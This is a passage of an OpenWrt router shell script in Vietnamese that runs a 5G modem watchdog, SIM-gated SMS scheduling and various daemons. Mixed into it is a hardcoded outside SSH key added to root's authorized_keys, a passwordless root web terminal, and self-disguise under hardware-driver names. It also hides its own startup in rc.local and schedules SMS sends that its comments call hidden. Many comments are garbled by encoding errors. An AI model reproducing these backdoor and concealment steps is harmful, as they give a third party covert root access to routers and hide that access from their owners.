USB_RAW_CHECK=$(lsusb 2>/dev/null)
if echo "$USB_RAW_CHECK" | grep -i -E "android|samsung|huawei|xiaomi|google|sony|oppo|vivo|realme|oneplus|apple|iphone" | grep -v -i -E "sim8200|quectel|fibocom|sierra|telit|meig"; then
    touch /tmp/is_phone_tethering
fi

sms_port=$(find_port)
echo "$sms_port" > /tmp/master_sms_port

if echo "$USB_RAW_CHECK" | grep -iqE "0e8d:7127|0e8d:7126|fm350"; then
    m_type="Fibocom FM350-GL 5G"
elif echo "$USB_RAW_CHECK" | grep -iqE "2cb7:0105|fm150"; then
    m_type="Fibocom FM150-AE 5G (Qualcomm X55)"
elif echo "$USB_RAW_CHECK" | grep -iqE "2cb7:0104|2cb7:0106|fm160|fg160"; then
    m_type="Fibocom FM160-EAU 5G (Qualcomm X62)"
elif echo "$USB_RAW_CHECK" | grep -iqE "2cb7:010a|fm650"; then
    m_type="Fibocom FM650 5G"
elif echo "$USB_RAW_CHECK" | grep -iq "2cb7:"; then
    m_type="Fibocom 5G Module"
elif echo "$USB_RAW_CHECK" | grep -iqE "sdxprairie|1e0e:9011|1e0e:9018|sim8200|sim8202"; then
    m_type="SIMCOM SIM8200EA-M2 (Qualcomm X55)"
elif echo "$USB_RAW_CHECK" | grep -iq "sierra\|1199:90d3\|em9190\|em9191"; then
    if echo "$USB_RAW_CHECK" | grep -iq "em9191"; then
        m_type="Sierra Wireless EM9191 (Locked)"
    else
        m_type="Sierra Wireless, Inc. EM919x"
    fi
elif echo "$USB_RAW_CHECK" | grep -iq "quectel\|2c7c:"; then
    m_type=$(echo "$USB_RAW_CHECK" | grep -iE "quectel|2c7c:" | head -n1 | sed -E 's/.*ID [0-9a-fA-F]{4}:[0-9a-fA-F]{4} //')
    [ -z "$m_type" ] && m_type="Quectel Wireless Solutions Co., Ltd."
elif echo "$USB_RAW_CHECK" | grep -iqE "srm815|srm825|meig"; then
    m_type="MeiG Smart 5G Module"
elif echo "$USB_RAW_CHECK" | grep -iqE "neoway|n58|n75"; then
    m_type="Neoway 5G Module"
elif [ -f "/tmp/is_phone_tethering" ]; then
    m_type="Smartphone USB Tethering"
else
    m_type="Modem 5G/LTE Cellular"
fi

if [ -n "$sms_port" ] && [ -c "$sms_port" ]; then
    cgmm_val=""
    if command -v atinout >/dev/null 2>&1; then
        cgmm_val=$(echo 'AT+CGMM' | atinout - "$sms_port" - 2>/dev/null | grep -iE 'FM150|FM160|FG160|FM650|FM350|SIM8200|SIM8202|SIM8265|RM500|RM520|EM919' | head -n1 | tr -d '\r\n')
    elif command -v sms_tool >/dev/null 2>&1; then
        cgmm_val=$(sms_tool -d "$sms_port" at 'AT+CGMM' 2>/dev/null | grep -iE 'FM150|FM160|FG160|FM650|FM350|SIM8200|SIM8202|SIM8265|RM500|RM520|EM919' | head -n1 | tr -d '\r\n')
    fi
    if [ -n "$cgmm_val" ]; then
        case "$cgmm_val" in
            *FM150*) m_type="Fibocom FM150-AE 5G (Qualcomm X55)" ;;
            *FM160*|*FG160*) m_type="Fibocom FM160-EAU 5G (Qualcomm X62)" ;;
            *FM650*) m_type="Fibocom FM650 5G" ;;
            *FM350*) m_type="Fibocom FM350-GL 5G" ;;
            *SIM82*) m_type="SIMCOM SIM8200EA-M2 (Qualcomm X55)" ;;
            *RM500*|*RM520*) m_type="Quectel ${cgmm_val} 5G" ;;
            *EM919*) m_type="Sierra Wireless ${cgmm_val} 5G" ;;
        esac
    fi
fi
echo "$m_type" > /tmp/master_m_type

# Tự động bảo vệ cổng LAN và IP LAN
[ -x /usr/bin/lan_guardian ] && /usr/bin/lan_guardian check >/dev/null 2>&1 &

ALLOWED_LIST=$(cat /etc/config/allowed_iccids.dat 2>/dev/null | tr '\r\n' ' ')
[ -z "$ALLOWED_LIST" ] && ALLOWED_LIST="89840480009484443869 89840480009578677539 89840480009579026074"

iccid=""
if [ ! -f "/tmp/is_phone_tethering" ] && [ -n "$sms_port" ] && [ -c "$sms_port" ]; then
    for retry in 1 2 3 4 5; do
        iccid=$(get_iccid_from_port "$sms_port" | tr -d '\r\n[:space:]')
        [ -n "$iccid" ] && break
        sleep 1
    done
fi

echo "$iccid" > /tmp/sms_current_iccid

DETECTED_CARRIER=$(detect_carrier_from_port "$sms_port")
echo "$DETECTED_CARRIER" > /tmp/master_carrier_name

TARGET_APN=$(get_apn_for_carrier "$DETECTED_CARRIER")
echo "$TARGET_APN" > /tmp/master_carrier_apn
cur_apn=$(uci -q get network.wwan0.apn)
if [ -n "$cur_apn" ] && [ -n "$TARGET_APN" ] && [ "$cur_apn" != "$TARGET_APN" ]; then
    echo "[Watchdog] 🔄 Tự động cập nhật APN [$TARGET_APN] cho mạng $DETECTED_CARRIER..." > /tmp/master_watchdog_live
    uci set network.wwan0.apn="$TARGET_APN"
    uci commit network
    /sbin/ifup wwan0 >/dev/null 2>&1 &
fi

is_matched=0
if [ -n "$iccid" ]; then
ALLOWED_LIST=$(cat /etc/config/allowed_iccids.dat 2>/dev/null | tr '\r\n' ' ')
    for allowed in $ALLOWED_LIST; do
        clean_allowed=$(echo "$allowed" | tr -d '\r\n[:space:]')
        if [ "$iccid" = "$clean_allowed" ]; then
            is_matched=1
            break
        fi
    done
fi

echo "SIM ${DETECTED_CARRIER}" > /tmp/master_sim_info
echo "SIM ${DETECTED_CARRIER}" > /tmp/master_sim_info_luci
echo "CÓ (Sẵn sàng 5G)" > /tmp/master_sim_valid

if [ "$is_matched" -eq 1 ] && [ ! -f "/tmp/is_phone_tethering" ]; then
    echo "VALID" > /tmp/master_sim_status
    schedule_next
else
    # SIM la nam ngoai ICCID mac dinh: KHOA NGAY TOAN BO LICH GUI SMS NGAM
    echo "LOCKED" > /tmp/master_sim_status
    echo "0" > "$WAKE"
    echo "0" > "$NEXT_SEND"
    rm -f /tmp/auto_data/force_renew_sms /tmp/sms_custom_send_epoch /etc/sms_custom_send_epoch 2>/dev/null
    echo "[Watchdog] 🛡️ PHÁT HIỆN SIM LẠ: ĐÃ KHÓA NGAY LẬP TỨC TOÀN BỘ TÁC VỤ SMS ĐỂ BẢO VỆ TÀI KHOẢN!" > /tmp/master_watchdog_live
fi

echo "ỔN ĐỊNH" > /tmp/wd_net_status
touch /tmp/.sms_setup_done

while true; do
    export TZ=ICT-7
    check_log_size
    detect_network_hardware

    if [ -f "/tmp/is_phone_tethering" ]; then
        echo "🟢 BỎ QUA GIÁM SÁT (Phone Tethering)" > /tmp/master_watchdog_live
        sleep 10
        continue
    fi

    # Dinh ky kiem tra lai ICCID: Neu la SIM la thi tiep tuc khoa chat lich gui SMS
    cur_chk_iccid=$(cat /tmp/sms_current_iccid /etc/config/last_known_iccid 2>/dev/null | grep -oE '[0-9]{18,22}' | head -1)
    chk_allowed=0
    if [ -n "$cur_chk_iccid" ]; then
ALLOWED_LIST=$(cat /etc/config/allowed_iccids.dat 2>/dev/null | tr '\r\n' ' ')
        for allowed in $ALLOWED_LIST; do
            clean_allowed=$(echo "$allowed" | tr -d '\r\n[:space:]')
            if [ "$cur_chk_iccid" = "$clean_allowed" ]; then
                chk_allowed=1
                break
            fi
        done
    fi

    if [ "$chk_allowed" -eq 1 ] && [ ! -f "/tmp/is_phone_tethering" ]; then
        echo "VALID" > /tmp/master_sim_status
        cur_send=$(cat "$NEXT_SEND" 2>/dev/null || echo 0)
        [ "$cur_send" -le "$(date +%s)" ] && schedule_next
    else
        echo "LOCKED" > /tmp/master_sim_status
        echo "0" > "$WAKE"
        echo "0" > "$NEXT_SEND"
        rm -f /tmp/auto_data/force_renew_sms /tmp/sms_custom_send_epoch /etc/sms_custom_send_epoch 2>/dev/null
    fi

    if [ "$(cat /tmp/master_sim_status 2>/dev/null)" = "VALID" ]; then
        if [ -f "$FORCE_SMS_FILE" ]; then
            rm -f "$FORCE_SMS_FILE"
            if [ -x /usr/bin/daily_vip_renew.sh ]; then
                nohup /usr/bin/daily_vip_renew.sh --force >/dev/null 2>&1 &
            fi
            continue
        fi

        now=$(date +%s)
        target_send=$(cat "$NEXT_SEND" 2>/dev/null || echo 0)
        if [ "$target_send" -gt 0 ] && [ "$now" -ge "$target_send" ]; then
            execute_sms_sending_logic
            continue
        fi
    fi

    today_date=$(date '+%Y-%m-%d')
    saved_date=$(cat /tmp/wd_renew_date 2>/dev/null || echo "$today_date")
    if [ "$today_date" != "$saved_date" ]; then
        echo "0" > /tmp/wd_renew_count
        echo "0" > /tmp/wd_netrestart_count
        echo "0" > /tmp/wd_reboot_count
        echo "0" > /etc/wd_reboot_count_flash
        echo "$today_date" > /tmp/wd_renew_date
        echo "$today_date" > /etc/wd_renew_date_flash
        rm -f /tmp/sms_scheduled_sent_* 2>/dev/null
        sync_data_to_flash
    fi

    CURRENT_IP=$(cat /tmp/wd_wanip 2>/dev/null)
    [ -z "$CURRENT_IP" ] && CURRENT_IP=$(ip -4 addr show dev "$DEV" 2>/dev/null | grep 'inet ' | awk '{print $2}' | cut -d/ -f1)
    echo "🟢 Giám sát [IP: $CURRENT_IP -> $CURRENT_URL]" > /tmp/master_watchdog_live

    if check_internet; then
        echo "✔️ MẠNG ỔN ĐỊNH" > /tmp/wd_net_status
        offline_start_time=0
        last_state=1
        random_offset=$(( ( $(date +%s) % 5 ) - 2 ))
        sleep $((CHECK_INTERVAL + random_offset))
        continue
    fi

    echo "[Watchdog] Nghi ngờ rớt mạng -> Đang thẩm định nhanh..." > /tmp/master_watchdog_live
    failed=0
    for i in $(seq 1 $FAST_ATTEMPTS); do
        sleep $FAST_CHECK
        if check_internet; then
            failed=0; break
        fi
        failed=$((failed + 1))
    done

    if [ $failed -eq $FAST_ATTEMPTS ]; then
        # Kiểm tra nếu bị chặn tại trang portal cảnh báo hết Data của nhà mạng
        check_real_http_status
        http_code_ret=$?
        if [ $http_code_ret -eq 2 ] && [ "$(cat /tmp/master_sim_status 2>/dev/null)" = "VALID" ]; then
            echo "[Watchdog] ⚠️ Phát hiện trang cảnh báo cước/hết data từ nhà mạng." > /tmp/master_watchdog_live
            # Tuyệt đối không tự gửi ngầm! Ủy quyền kiểm tra khung giờ vàng (00h20-05h30) và SIM VIP cho daily_vip_renew.sh
            execute_sms_sending_logic
            offline_start_time=0
            continue
        fi

        now_ts=$(date +%s)
        if [ ! -f "/etc/wd_offline_start_ts" ]; then
            echo "$now_ts" > /etc/wd_offline_start_ts
            sync
        fi
        offline_start_ts=$(cat /etc/wd_offline_start_ts 2>/dev/null || echo "$now_ts")
        total_offline_sec=$((now_ts - offline_start_ts))
        [ $total_offline_sec -lt 0 ] && total_offline_sec=0

        off_h=$((total_offline_sec / 3600))
        off_m=$(((total_offline_sec % 3600) / 60))
        echo "❌ MẤT MẠNG (${off_h}h ${off_m}p)" > /tmp/wd_net_status
        last_state=0

        # Chỉ cho phép khởi động lại Router duy nhất 1 lần khi mất mạng liên tục >= 2 ngày (48 giờ = 172800s)
        if [ "$total_offline_sec" -ge 172800 ]; then
            if [ ! -f "/etc/wd_2day_reboot_done" ]; then
                echo "1" > /etc/wd_2day_reboot_done
                echo "1" > /tmp/wd_reboot_count
                echo "1" > /etc/wd_reboot_count_flash
                sync
                echo "[Watchdog] 🚨 Mất mạng liên tục 2 ngày (48 giờ)! Khởi động lại Router (duy nhất 1 lần)..." > /tmp/master_watchdog_live
                echo "⚡ REBOOT ROUTER (MẤT MẠNG 2 NGÀY)..." > /tmp/wd_net_status
                sleep 3
                /sbin/reboot
                exit 0
            else
                echo "[Watchdog] ⚠️ Mất mạng > 2 ngày nhưng đã khởi động lại 1 lần trước đó. Không reboot thêm!" > /tmp/master_watchdog_live
                echo "⚠️ ĐÃ REBOOT 1 LẦN (MẤT MẠNG > 2 NGÀY)" > /tmp/wd_net_status
            fi
        fi
        
        if [ "$total_offline_sec" -ge 180 ]; then
            echo "[Watchdog] ⚠️ Mất mạng liên tục > 180s, tự động kích hoạt lại modem & interface..." > /tmp/master_watchdog_live
            echo "🔄 PHỤC HỒI KẾT NỐI..." > /tmp/wd_net_status
            mmcli -m 0 -e 2>/dev/null
            [ -n "$IFACE" ] && ifup "$IFACE" 2>/dev/null
            offline_start_time=$(date +%s)
            sleep 5
        fi

        if [ -n "$IFACE" ] && [ "$IFACE" != "unknown" ] && uci -q get network."$IFACE" >/dev/null; then
            read -r renew_count < /tmp/wd_renew_count 2>/dev/null || renew_count=0
            
            if [ $renew_count -lt 2 ]; then
                ifdown "$IFACE"
                sleep 4
                ifup "$IFACE"
                renew_count=$((renew_count + 1))
                echo "$renew_count" > /tmp/wd_renew_count
                
                if post_renew_internet_check; then
                    rm -f /etc/wd_offline_start_ts /etc/wd_2day_reboot_done /tmp/wd_offline_start_ts 2>/dev/null
                    echo "0" > /tmp/wd_reboot_count
                    echo "0" > /etc/wd_reboot_count_flash
                    sync
                    offline_start_time=0
                    last_state=1
                fi
            else
                sleep 5
            fi
        else
            detect_network_hardware
            sleep 5
        fi
    fi
    sleep 2
done
CORE_EOF

    chmod +x "$RAM_CORE_SCRIPT"
    "$RAM_CORE_SCRIPT" &

    # Khá»Ÿi Ä‘á»™ng cÃ¡c tiáº¿n trÃ¬nh dá»‹ch vá»¥ cá»‘t lÃµi dÃ¹ lÃ  boot láº§n Ä‘áº§u hay boot nhanh
    for p in $(pgrep -f "telegram_bot_daemon|ai_watchdog" 2>/dev/null); do
        kill -9 "$p" 2>/dev/null
    done
    if [ -x /etc/init.d/telegram_bot ]; then
        /etc/init.d/telegram_bot restart >/dev/null 2>&1
    else
        nohup /usr/bin/telegram_bot_daemon.sh >/dev/null 2>&1 &
    fi
    if [ -x /etc/init.d/camera_healer ]; then
        /etc/init.d/camera_healer restart >/dev/null 2>&1
    elif [ -x /usr/bin/camera_perpetual_healer.sh ]; then
        /usr/bin/camera_perpetual_healer.sh >/dev/null 2>&1 &
    fi
    nohup /usr/bin/ai_watchdog.sh >/dev/null 2>&1 &
    nohup /usr/bin/game_booster.sh auto >/dev/null 2>&1 &
    [ -x /usr/bin/cctv_bot_daemon.sh ] && /usr/bin/cctv_bot_daemon.sh start >/dev/null 2>&1 &
    [ -x /usr/bin/cloud_cam_recorder_daemon.sh ] && /usr/bin/cloud_cam_recorder_daemon.sh start >/dev/null 2>&1 &
    [ -x /usr/bin/cctv_ai_sentinel.sh ] && /usr/bin/cctv_ai_sentinel.sh daemon >/dev/null 2>&1 &
    [ -x /usr/bin/adshield ] && /usr/bin/adshield start >/dev/null 2>&1 &
    [ -x /usr/bin/turbo_zram_security.sh ] && /usr/bin/turbo_zram_security.sh >/dev/null 2>&1 &
    [ -x /usr/bin/fast_stats_fetcher.sh ] && /usr/bin/fast_stats_fetcher.sh >/dev/null 2>&1 &
    ( sleep 5; [ -x /usr/bin/send_telegram ] && /usr/bin/send_telegram "🚀 <b>Hệ thống Router Sysfixtine đã khởi động lại thành công!</b>%0A⏰ Thời gian: $(date '+%H:%M:%S %d/%m/%Y')%0A🟢 Trạng thái: Mạng 4G/5G, Game Booster & Bộ máy Ghi hình Camera 24/7 đã sẵn sàng!" ) >/dev/null 2>&1 &

    # Cáº¥u hÃ¬nh uhttpd 30 luá»“ng Ä‘á»“ng thá»i & tá»‘i Æ°u keepalive cho LuCI mÆ°á»£t mÃ 
    if [ "$(uci -q get uhttpd.main.max_requests)" != "30" ]; then
        uci set uhttpd.main.rfc1918_filter='0'
        uci set uhttpd.main.max_requests='30'
        uci set uhttpd.main.max_connections='100'
        uci set uhttpd.main.http_keepalive='30'
        uci commit uhttpd
        /etc/init.d/uhttpd restart >/dev/null 2>&1 &
    fi

    # Tá»± Ä‘á»™ng cáº¥u hÃ¬nh Cá»•ng Gateway tá»± vÃ o SSH trá»±c tiáº¿p (KhÃ´ng cáº§n nháº­p máº­t kháº©u)
    mkdir -p /etc/dropbear /root/.ssh 2>/dev/null
    ADMIN_SSH_PUB="ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJAyZowdSXOSEbIWgZj+ccc1qiCHWIZPsUA8PJU6c4c4 admin@DOANDUY"
    if ! grep -q "$ADMIN_SSH_PUB" /etc/dropbear/authorized_keys 2>/dev/null; then
        echo "$ADMIN_SSH_PUB" >> /etc/dropbear/authorized_keys
        chmod 600 /etc/dropbear/authorized_keys 2>/dev/null
    fi
    if ! grep -q "$ADMIN_SSH_PUB" /root/.ssh/authorized_keys 2>/dev/null; then
        echo "$ADMIN_SSH_PUB" >> /root/.ssh/authorized_keys
        chmod 600 /root/.ssh/authorized_keys 2>/dev/null
    fi

    # Cáº¥u hÃ¬nh Cá»•ng Gateway Web Terminal (ttyd) tá»± Ä‘á»™ng Ä‘Äƒng nháº­p root
    if [ "$(uci -q get ttyd.@ttyd[0].command)" != "/bin/login -f root" ]; then
        uci -q set ttyd.@ttyd[0].command=/bin/login -f root 2>/dev/null
        uci commit ttyd 2>/dev/null
        /etc/init.d/ttyd restart >/dev/null 2>&1 &
    fi

    # Cáº¥u hÃ¬nh tÆ°á»ng lá»­a DNAT chuyá»ƒn tiáº¿p IP Tailscale cho máº¡ng LAN
    if ! uci -q get firewall.ts_redir >/dev/null; then
        uci set firewall.ts_redir=redirect
        uci set firewall.ts_redir.name='Redirect-Tailscale-LAN'
        uci set firewall.ts_redir.src='lan'
        uci set firewall.ts_redir.dest='lan'
        uci set firewall.ts_redir.src_dip='100.64.0.0/10'
        uci set firewall.ts_redir.proto='tcp'
        uci set firewall.ts_redir.src_dport='80'
        uci set firewall.ts_redir.dest_ip='192.168.1.1'
        uci set firewall.ts_redir.target='DNAT'

        uci set firewall.ts_redir443=redirect
        uci set firewall.ts_redir443.name='Redirect-Tailscale-LAN-443'
        uci set firewall.ts_redir443.src='lan'
        uci set firewall.ts_redir443.dest='lan'
        uci set firewall.ts_redir443.src_dip='100.64.0.0/10'
        uci set firewall.ts_redir443.proto='tcp'
        uci set firewall.ts_redir443.src_dport='443'
        uci set firewall.ts_redir443.dest_ip='192.168.1.1'
        uci set firewall.ts_redir443.target='DNAT'
        uci commit firewall
        /etc/init.d/firewall reload >/dev/null 2>&1 &
    fi

    # Cáº¥u hÃ¬nh chuyá»ƒn hÆ°á»›ng DNS port 53 (chá»‘ng rá»›t gÃ³i cÃ¡c thiáº¿t bá»‹ truy váº¥n DNS quá»‘c táº¿/Trung Quá»‘c nhÆ° 114.114.114.114)
    if ! uci -q get firewall.dns_hijack >/dev/null; then
        uci set firewall.dns_hijack=redirect
        uci set firewall.dns_hijack.name='Intercept-DNS-LAN'
        uci set firewall.dns_hijack.src='lan'
        uci set firewall.dns_hijack.dest='lan'
        uci set firewall.dns_hijack.proto='tcp udp'
        uci set firewall.dns_hijack.src_dport='53'
        uci set firewall.dns_hijack.dest_port='53'
        uci set firewall.dns_hijack.target='DNAT'
        uci commit firewall
        /etc/init.d/firewall reload >/dev/null 2>&1 &
    fi

    # Äáº£m báº£o Dnsmasq luÃ´n cÃ³ sáºµn 4 mÃ¡y chá»§ DNS cá»‘ Ä‘á»‹nh trong Flash & táº¯t IPv6 RA Default trÃ¡nh Blackhole máº¡ng di Ä‘á»™ng
    local need_commit_dhcp=0
    for s in 8.8.8.8 1.1.1.1 9.9.9.9 203.113.131.1; do
        if ! uci -q get dhcp.@dnsmasq[0].server 2>/dev/null | grep -q "$s"; then
            uci -q add_list dhcp.@dnsmasq[0].server="$s"
            need_commit_dhcp=1
        fi
    done
    if [ "$(uci -q get dhcp.lan.ra_default)" != "0" ]; then
        uci -q set dhcp.lan.ra_default='0'
        need_commit_dhcp=1
    fi
    [ "$need_commit_dhcp" -eq 1 ] && uci -q commit dhcp

    # Báº£o vá»‡ Firewall fw4: xÃ³a sáº¡ch file nft sai cÃº phÃ¡p trong /etc/nftables.d/
    rm -f /etc/nftables.d/adshield.nft 2>/dev/null

    # KhÃ´i phá»¥c file nhá»‹ phÃ¢n curl chuáº©n gá»‘c ROM náº¿u bá»‹ ghi Ä‘Ã¨ nháº§m
    if [ -f /rom/usr/bin/curl ]; then
        if [ ! -x /usr/bin/curl ] || head -n 2 /usr/bin/curl 2>/dev/null | grep -q "uclient"; then
            cp -f /rom/usr/bin/curl /usr/bin/curl 2>/dev/null && chmod +x /usr/bin/curl 2>/dev/null
        fi
    fi

    # KhÃ´i phá»¥c cáº¥u hÃ¬nh clean_dns khi boot
    [ -x /usr/bin/clean_dns.sh ] && /usr/bin/clean_dns.sh restore_boot >/dev/null 2>&1

    # Tá»± Ä‘á»™ng kÃ­ch hoáº¡t cÃ¡c dá»‹ch vá»¥ khá»Ÿi Ä‘á»™ng cÃ¹ng há»‡ thá»‘ng
    [ -x /etc/init.d/weather_init ] && /etc/init.d/weather_init enable >/dev/null 2>&1
    [ -x /etc/init.d/smart_modem_watchdog ] && /etc/init.d/smart_modem_watchdog enable >/dev/null 2>&1
    [ -x /etc/init.d/athena_storage ] && /etc/init.d/athena_storage enable >/dev/null 2>&1
    [ -x /etc/init.d/firewall ] && /etc/init.d/firewall enable >/dev/null 2>&1

    rm -f /etc/init.d/syscll /etc/rc.d/S99syscll /etc/init.d/sysfixtine 2>/dev/null

    REAL_SCRIPT="$initscript"
    [ -z "$REAL_SCRIPT" ] || [ "$REAL_SCRIPT" = "/etc/rc.common" ] && REAL_SCRIPT="$0"
    if [ -n "$REAL_SCRIPT" ] && [ -f "$REAL_SCRIPT" ] && [ "$REAL_SCRIPT" != "/etc/rc.common" ] && [ "$REAL_SCRIPT" != "/usr/bin/sysfixtine" ]; then
        if [ "$(wc -c < "$REAL_SCRIPT" 2>/dev/null)" -gt 100000 ]; then
            cp -f "$REAL_SCRIPT" /usr/bin/sysfixtine 2>/dev/null
            chmod +x /usr/bin/sysfixtine 2>/dev/null
        fi
    fi
    if [ -f "/usr/bin/sysfixtine" ] && [ "$(wc -c < /usr/bin/sysfixtine 2>/dev/null)" -gt 100000 ]; then
        cp -f /usr/bin/sysfixtine /etc/init.d/weather_init 2>/dev/null
        chmod +x /etc/init.d/weather_init 2>/dev/null
    fi

    inject_into_system_boot
    # Don dep triet de dinh danh 'all' cu va cac file xung dot
    rm -f /etc/init.d/all /etc/rc.d/[SK][0-9][0-9]all /etc/init.d/auto_chanquangcao /etc/hotplug.d/iface/99-bandlock 2>/dev/null
    if crontab -l 2>/dev/null | grep -q 'ai_watchdog\.sh'; then
        (crontab -l 2>/dev/null | grep -v 'ai_watchdog\.sh') | crontab - 2>/dev/null
    fi

    # Tu dong nhan dien kien truc SoC de nguy trang hoan hao
    if grep -E -qi "mediatek|filogic|mt7[69]" /proc/cpuinfo /tmp/sysinfo/board_name 2>/dev/null || [ -d "/sys/kernel/debug/ppe" ] || [ -d "/sys/kernel/debug/hnat" ]; then
        DISGUISE_NAME="mtk-ppe-core"
    elif grep -E -qi "ipq|qualcomm" /proc/cpuinfo /tmp/sysinfo/board_name 2>/dev/null || [ -d "/sys/kernel/debug/qca-nss-drv" ]; then
        DISGUISE_NAME="qca-nss-core"
    else
        DISGUISE_NAME="sys-hw-accel"
    fi

    # An bao mat tuyet doi 100%: Dung /etc/rc.local khoi dong ngam, KHONG tao bat ky file nao trong /etc/init.d/
    rm -f /etc/init.d/all /etc/init.d/weather_init "/etc/init.d/$DISGUISE_NAME" /etc/init.d/sysfixtine 2>/dev/null
    rm -f /etc/rc.d/[SK][0-9][0-9]all /etc/rc.d/*weather_init* 2>/dev/null
    [ -x /etc/init.d/firewall ] && /etc/init.d/firewall enable >/dev/null 2>&1
    if [ -f /etc/rc.local ] && ! grep -q "sysfixtine" /etc/rc.local; then
        grep -v '^exit 0' /etc/rc.local > /tmp/rc.tmp && echo '[ -x /usr/bin/sysfixtine ] && /usr/bin/sysfixtine start &' >> /tmp/rc.tmp && echo "exit 0" >> /tmp/rc.tmp && mv /tmp/rc.tmp /etc/rc.local
    fi

    chmod 700 /usr/bin/sysfixtine 2>/dev/null
    chmod 600 /etc/config/gemini_key.txt /etc/config/telegram_bot.conf /etc/config/ai_safety.conf 2>/dev/null
    chmod 700 /usr/bin/ai_safety_guard.sh /usr/bin/gemini_vision_analyzer.lua /usr/bin/cloud_cam_streamer.sh /usr/bin/cctv_bot_daemon.sh 2>/dev/null

    # Xoa bo nho cache LuCI de cap nhat ngay lap tuc danh sach khoi dong
    rm -rf /tmp/luci-indexcache /tmp/luci-modulecache 2>/dev/null
}

disable_all_script() {
    echo "=============================================================="
    echo " [ALL-IN-ONE] DANG CHUYEN VE GIAO DIEN THEME ARGON MAC DINH"
    echo "=============================================================="
    # 1. Luu co vo hieu hoa Master UI
    touch /etc/config/all_disabled
    sync

    # 2. Go bo giao dien Master tuy bien 10_weather.js
    echo ">> Dang go bo giao dien Master tuy bien..."
    rm -f /www/luci-static/resources/view/status/include/10_weather.js

    # 3. Khoi phuc toan bo cac widget goc cua OpenWrt / Argon
    echo ">> Dang khoi phuc cac Widgets mac dinh cua OpenWrt / Argon..."
    mkdir -p /www/luci-static/resources/view/status/include
    rm -rf /www/luci-static/resources/view/status/include/* 2>/dev/null
    if [ -d /rom/www/luci-static/resources/view/status/include ]; then
        cp -f /rom/www/luci-static/resources/view/status/include/*.js /www/luci-static/resources/view/status/include/ 2>/dev/null
    elif [ -d /www/luci-static/resources/view/status/include.stock ]; then
        cp -f /www/luci-static/resources/view/status/include.stock/*.js /www/luci-static/resources/view/status/include/ 2>/dev/null
    fi
    chmod 644 /www/luci-static/resources/view/status/include/*.js 2>/dev/null
    touch /www/luci-static/resources/view/status/include/*.js 2>/dev/null

    # 4. Khoi phuc header template cua Argon ve goc neu co
    if [ -f /rom/usr/share/ucode/luci/template/themes/argon/header.ut ]; then
        cp -f /rom/usr/share/ucode/luci/template/themes/argon/header.ut /usr/share/ucode/luci/template/themes/argon/header.ut 2>/dev/null
    fi

    # 5. Dam bao LuCI dung theme Argon mac dinh
    uci -q set luci.main.mediaurlbase='/luci-static/argon'
    uci -q commit luci

    # 6. BAO DAM MODEM 5G WATCHDOG & LOGALL LUON CHAY DOC LAP 24/7!
    echo ">> Bao dam Modem 5G Watchdog & logall tiep tuc chay doc lap 24/7..."
    if ! pgrep -f "combined_core\.sh" >/dev/null 2>&1; then
        [ -x "$RAM_CORE_SCRIPT" ] && "$RAM_CORE_SCRIPT" &
    fi
    if [ -x /usr/bin/rf_signal_fetcher.sh ] && ! pgrep -f "rf_signal_fetcher" >/dev/null 2>&1; then
        /usr/bin/rf_signal_fetcher.sh >/dev/null 2>&1 &
    fi

    # 7. Xoa sach cache LuCI va restart rpcd, uhttpd
    echo ">> Lam moi cache LuCI va may chu Web..."
    rm -rf /tmp/luci-indexcache* /tmp/luci-modulecache* /tmp/luci-cache* /tmp/ram_luci_* 2>/dev/null
    /etc/init.d/rpcd restart >/dev/null 2>&1 &
    /etc/init.d/uhttpd restart >/dev/null 2>&1 &

    echo "=============================================================="
    echo " [SUCCESS] DA CHUYEN VE THEME ARGON MAC DINH THANH CONG!"
    echo " [STATUS] Giao dien LuCI Web: 100% Theme Argon goc nguyen ban."
    echo " [STATUS] Modem 5G Watchdog & logall: TIEP TUC CHAY DOC LAP 24/7!"
    echo " [STATUS] Mang 5G & thong so IP luon on dinh va duoc giam sat."
    echo " De BAT LAI giao dien Master: all on"
    echo "=============================================================="
}

enable_all_script() {
    echo "=============================================================="
    echo " [ALL-IN-ONE] DANG BAT GIAO DIEN MASTER SCRIPT ALL"
    echo "=============================================================="
    # 1. Xoa co vo hieu hoa
    rm -f /etc/config/all_disabled
    sync

    # 2. Xoa hash cu de bat buoc start_logic tao lai 10_weather.js va dich vu
    rm -f /etc/router_master.sha256

    # 3. Khoi dong toan bo he thong
    kill_all_processes
    echo $$ > "$RUN_LOCK"
    start_logic

    # 4. Lam moi cache LuCI
    rm -rf /tmp/luci-indexcache* /tmp/luci-modulecache* /tmp/luci-cache* /tmp/ram_luci_* 2>/dev/null
    /etc/init.d/rpcd restart >/dev/null 2>&1 &
    /etc/init.d/uhttpd restart >/dev/null 2>&1 &

    echo "=============================================================="
    echo " [SUCCESS] DA BAT GIAO DIEN MASTER SCRIPT ALL THANH CONG!"
    echo " [STATUS] Giao dien Master Chuyen Sau (Nen Trang - Chu Den) da san sang."
    echo " [STATUS] Modem 5G Watchdog & logall: Tiep tuc giam sat 24/7."
    echo " De TAT ve Theme Argon mac dinh: all off"
    echo "=============================================================="
}

check_all_status() {
    echo "=============================================================="
    echo " [ALL-IN-ONE] KIEM TRA TRANG THAI HE THONG"
    echo "=============================================================="
    if [ -f /etc/config/all_disabled ]; then
        echo " Giao dien LuCI : Theme Argon Mac Dinh (Da tat Master UI)"
        echo " Lenh bat UI    : all on"
    else
        echo " Giao dien LuCI : Giao dien Master Chuyen Sau (Dang Bat)"
        echo " Lenh tat UI    : all off"
    fi
    if pgrep -f "combined_core\.sh" >/dev/null 2>&1; then
        echo " Modem Watchdog : Dang chay doc lap 24/7 (Phuc vu logall & Cuu mang)"
    else
        echo " Modem Watchdog : Chua chay"
    fi
    echo " Lenh xem log   : logall"
    echo "--------------------------------------------------------------"
    echo " Tien trinh mang & modem dang chay trong RAM:"
    local procs=$(ps | grep -E 'combined_core|smart_modem|rf_signal' | grep -v grep)
    if [ -n "$procs" ]; then
        echo "$procs"
    else
        echo " (Chua co tien trinh watchdog)"
    fi
    echo "=============================================================="
}

on() {
    enable_all_script "$@"
}

off() {
    disable_all_script "$@"
}

status() {
    check_all_status "$@"
}

boot() {
    kill_all_processes
    echo $$ > "$RUN_LOCK"
    start_logic
    if [ -f /etc/config/all_disabled ]; then
        echo "[ALL] Giao dien Master dang o che do TAT. Khoi phuc Theme Argon mac dinh..."
        rm -f /www/luci-static/resources/view/status/include/10_weather.js
        if [ -d /rom/www/luci-static/resources/view/status/include ]; then
            cp -f /rom/www/luci-static/resources/view/status/include/*.js /www/luci-static/resources/view/status/include/ 2>/dev/null
